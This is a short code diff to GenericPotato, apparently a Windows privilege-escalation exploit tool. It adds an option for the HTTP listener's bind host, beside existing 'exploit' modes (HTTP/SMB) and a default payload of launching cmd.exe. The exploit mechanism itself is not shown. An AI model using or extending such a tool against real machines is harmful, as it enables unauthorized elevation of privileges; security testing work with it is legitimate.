@@ -16,6 +16,7 @@ namespace GenericPotato {
         static void Main(string[] args) {
 
             ushort port = 8888;
+            string host = "127.0.0.1";
             string program = @"c:\Windows\System32\cmd.exe";
             string programArgs = null;
             ExecutionMethod executionMethod = ExecutionMethod.Auto;
@@ -33,6 +34,7 @@ namespace GenericPotato {
                 .Add("a=|args=", "Arguments for program (default null)", v => programArgs = v)
                 .Add<PotatoAPI.Mode>("e=|exploit=", "Exploit mode [HTTP|SMB(default)] ", v => mode = v)
                 .Add<ushort>("l=|port=", "HTTP port to listen on (default 8888)", v => port = v)
+                .Add("i=|host=", "HTTP host to listen on (default 127.0.0.1)", v => host = v)
                 .Add("h|help", "Display this help", v => showHelp = v != null);
 
             try {
@@ -69,7 +71,7 @@ namespace GenericPotato {
                     }
                 }
 
-                PotatoAPI potatoAPI = new PotatoAPI(port, mode);
+                PotatoAPI potatoAPI = new PotatoAPI(port, host, mode);
                 potatoAPI.readyEvent.WaitOne(); // Wait for listener to start
                 Console.WriteLine($"[+] Listener ready");
 
